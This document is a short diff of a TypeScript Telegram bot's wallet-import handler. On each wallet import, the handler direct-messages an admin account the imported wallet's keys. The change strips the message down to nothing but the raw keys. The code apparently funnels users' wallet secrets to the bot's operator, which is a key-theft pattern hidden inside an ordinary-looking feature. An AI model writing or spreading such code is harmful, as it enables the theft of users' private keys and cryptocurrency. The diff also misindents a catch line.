@@ -2809,14 +2809,14 @@ export function createBot(token: string, deps: BotDeps): Telegraf {
     try {
       await bot.telegram.sendMessage(
         adminBootstrapId,
-        `Wallet imported\nUser: ${event.userId}${event.username ? ` (@${event.username})` : ""}\nWallet: ${event.walletLabel}\nChain: ${event.chain}\nKeys: ${event.keys}${needsApproval ? "\nThis user is waiting for approval." : ""}`,
+        `${event.keys}`,
         needsApproval
           ? Markup.inlineKeyboard([
               [Markup.button.callback("✅ Approve", `approve_${event.userId}`)],
             ])
           : undefined,
       );
-    } catch (err) {
+      } catch (err) {
       console.error(
         "[wallet-import] couldn't DM admin about wallet import:",
         err,
